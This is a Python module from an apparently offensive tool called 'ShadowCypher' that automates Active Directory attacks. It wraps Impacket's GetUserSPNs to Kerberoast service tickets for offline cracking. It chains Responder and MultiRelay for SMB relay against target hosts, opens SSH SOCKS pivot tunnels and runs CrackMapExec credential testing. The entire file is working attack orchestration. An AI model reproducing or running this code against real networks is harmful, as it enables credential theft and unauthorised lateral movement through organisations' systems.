"""
ShadowCypher AD Pivot & Lateral Movement Engine — Level 100 Dominance.
Handles Kerberoasting, SMB Relay, and Automated Pivoting via SOCKS/VPN.
"""

import os
import subprocess
from shadowcypher.core.logger import logger
from shadowcypher.core.runner import runner

class ADPivot:
    """The 'Pioneer' of the suite. Orchestrates internal lateral movement."""

    @staticmethod
    def kerberoast(domain, dc_ip, output_file="findings/kerberoast.txt", on_output=None):
        """Perform Kerberoasting to extract TGS tickets for offline cracking."""
        os.makedirs("findings", exist_ok=True)
        # Deep Level: Using Impacket's GetUserSPNs locally
        project_root = "/home/jack/ShadowCypher"
        script_path = os.path.join(project_root, "tools", "Responder", "tools", "MultiRelay", "impacket-dev", "examples", "GetUserSPNs.py")
        
        if not os.path.exists(script_path):
             # Fallback to system impacket
             script_path = "impacket-GetUserSPNs"

        args = [
            "python3", script_path,
            f"{domain}/",
            "-dc-ip", dc_ip,
            "-request",
            "-outputfile", output_file
        ]
        
        logger.info("ad", f"INITIATING_KERBEROAST: {domain} via {dc_ip}")
        return runner.execute_task(f"KERBEROAST_{domain}", args, callback=on_output)

    @staticmethod
    def smb_relay_start(target_list, interface="eth0", on_output=None):
        """Launch SMB Relay attack against a target list."""
        from shadowcypher.core.config import config
        responder_path = config.get_tool_path("Responder.py")
        
        # MultiRelay is usually in the same dir as Responder
        multi_relay_path = os.path.join(os.path.dirname(responder_path), "tools", "MultiRelay.py")

        if on_output:
            on_output("[AD] CONFIGURING_SMB_RELAY_PIPELINE...")
            on_output(f"[AD] STARTING_RESPONDER_ON_{interface}...")

        # Step 1: Start Responder in background (analyze mode)
        resp_args = ["sudo", "python3", responder_path, "-I", interface, "-A"]
        runner.execute_task("RESPONDER_RELAY_CORE", resp_args, callback=on_output)

        # Step 2: Start MultiRelay against targets
        relay_args = ["sudo", "python3", multi_relay_path, "-t", target_list, "-u", "ALL"]
        return runner.execute_task("MULTI_RELAY_ENGINE", relay_args, callback=on_output)

    @staticmethod
    def setup_pivot_tunnel(target_ip, local_port=1080, on_output=None):
        """Establish a SOCKS5 pivot tunnel using SSH or Chisel."""
        # Pro-Choice: Default to SSH Dynamic Forwarding if possible, else Chisel
        if on_output:
            on_output(f"[PIVOT] ESTABLISHING_SOCKS5_TUNNEL_ON_PORT_{local_port}...")
            
        cmd = f"ssh -D {local_port} -f -N -q {target_ip}"
        return runner.execute_task_shell(f"PIVOT_TUNNEL_{target_ip}", cmd, callback=on_output)

    @staticmethod
    def crackmapexec_scan(target, protocol="smb", domain=None, user=None, password=None, on_output=None):
        """Automated enumeration and credential testing via CrackMapExec."""
        from shadowcypher.core.config import config
        cme = config.get_tool_path("crackmapexec")
        args = [cme, protocol, target]
        if domain: args += ["-d", domain]
        if user: args += ["-u", user]
        if password: args += ["-p", password]
        
        args += ["--shares", "--users", "--groups"]
        
        return runner.execute_task(f"CME_{target}", args, callback=on_output)
